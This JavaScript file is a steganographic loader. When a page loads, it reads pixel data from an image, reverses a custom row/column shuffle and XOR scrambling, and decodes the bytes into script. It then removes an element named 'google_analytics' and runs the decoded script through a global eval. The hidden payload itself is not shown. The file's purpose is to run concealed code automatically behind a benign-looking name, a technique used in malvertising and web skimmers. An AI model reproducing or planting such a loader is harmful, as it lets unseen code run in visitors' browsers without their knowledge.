var globalEval = function globalEval(src) {
	if (window.execScript) {
		window.execScript(src);
		return;
	}
	var fn = function() {
		window.eval.call(window,src);
	};
	fn();
};


window.onload = function(){
	var i = document.getElementById('cc'),
		i_w = i.width,
		i_h = i.height,
		cd = document.getElementById('cd'),
		ctx = cd.getContext('2d');

	cd.width = i_w;
	cd.height = i_h;

	ctx.drawImage(i,0,0);

	var imageData = ctx.getImageData(0,0,i_w,i_h),
		data = imageData.data,
		dlen = data.length


	var toImageMatrix = function(data)
	{
		var	pixel_size = 4,
			pixels_per_row = i_w * pixel_size;
		
		// To image matrix
		var image_matrix = [],
			pixel = new Uint8Array(pixel_size);
			temp_row = []

		var max_column = 0

		// Make Image Matrix
		for (var d=0; d < dlen; d++)
		{
			var rgba_index = d % pixel_size;
			pixel[rgba_index] = data[d];

			if (rgba_index === pixel_size - 1){
				temp_row.push(pixel);
				pixel = new Uint8Array(pixel_size);

				var row = parseInt(d / pixels_per_row),
					column = parseInt((d - ( row * pixels_per_row )) / pixel_size)

				if ( column === (i_w - 1) ){
					image_matrix.push(temp_row);
					temp_row = []
				}
			}
		}
		return image_matrix
	}


	var image_matrix = toImageMatrix(data)


	var diag_shift = 22, diag_xor = 247, rgb_xor = 93;

	var column_shift_map = {
		2:[22, 17,[56,71,90]],
		23:[-7, 56,[53,45,112]],
		3: [33,-90,[93,11,65]],
		14: [99,-76,[31,65,2]],
		6: [-20,12,[14,15,16]],
		190: [20,12,[14,15,16]]
	}

	// Asc. order -- none of this really matters
	var column_shift_order = Object.keys(column_shift_map).sort(
		function(a, b) {
		  return a - b;
		});

	for (var row=i_h-1; row >=0; row --){
		for (var col=0; col < i_w; col ++)
		{
			// Unshuffle rows and cols
			for (var t=column_shift_order.length-1; t >= 0; t--){
				var cmod = column_shift_order[t];

				if (col % cmod === 0){
					var row_diff = column_shift_map[cmod][0],
						col_diff = column_shift_map[cmod][1],
						xor_diff = column_shift_map[cmod][2];

					var nrow = (i_h + row+row_diff) % i_h,
						ncol = (i_w + col+col_diff) % i_w

					for (var p=0; p < 3; p++){
						image_matrix[nrow][ncol][p] ^= xor_diff[p]
					}

					var tmp = image_matrix[nrow][ncol]
					image_matrix[nrow][ncol] = image_matrix[row][col]
					image_matrix[row][col] = tmp;
				}
			}

			for (var p=0; p<3; p++){
				image_matrix[row][col][p] ^= rgb_xor
			}
		}

		var tmp = image_matrix[(row+diag_shift)%i_h][(row+diag_shift)%i_w]
		image_matrix[(row+diag_shift) % i_h][(row+diag_shift) % i_w] = image_matrix[row][row]
		image_matrix[row][row] = tmp

		for (var p=0; p < 3; p++){
			image_matrix[row][row][p] ^= diag_xor
		}
	}

	// Decode (this works)
	var code = [];
	for (var r = 0; r < i_h; r++){
		for (var c = 0; c < i_w; c++){
			code.push(image_matrix[r][c][0])
			code.push(image_matrix[r][c][1])
			code.push(image_matrix[r][c][2])
		}
	}

	var new_script = String.fromCharCode.apply(String,code);
	new_script = new_script.split("//////")[0];  // Split from terminal character
//	console.log(new_script)
	var io = document.getElementById('google_analytics')
	io.remove();

	globalEval(new_script)
}